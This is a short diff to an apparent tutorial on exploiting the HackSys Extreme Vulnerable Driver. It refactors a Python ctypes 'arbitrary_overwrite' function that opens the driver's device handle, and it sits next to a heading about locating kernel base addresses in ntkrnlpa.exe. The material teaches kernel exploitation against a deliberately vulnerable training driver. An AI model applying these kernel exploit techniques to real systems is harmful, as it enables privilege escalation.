@@ -124,8 +124,9 @@ def arbitrary_overwrite():
     kernel32              = windll.kernel32
     psapi                 = windll.Psapi
     ntdll                 = windll.ntdll
-    
-    device_handle = kernel32.CreateFileA("\\\\.\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
+
+    lpFileName = "\\\\.\HackSysExtremeVulnerableDriver"
+    device_handle = kernel32.CreateFileA(lpFileName, 0xC0000000, 0, None, 0x3, 0, None)
  
     if not device_handle or device_handle == -1:
         print("[!] Error creating Device handle:" + ctypes.GetLastError())
@@ -141,6 +142,7 @@ def arbitrary_overwrite():
  
 if __name__ == "__main__":
     arbitrary_overwrite()
+
 ```
 
 ### Get the Base Name and address from ntkrnlpa.exe
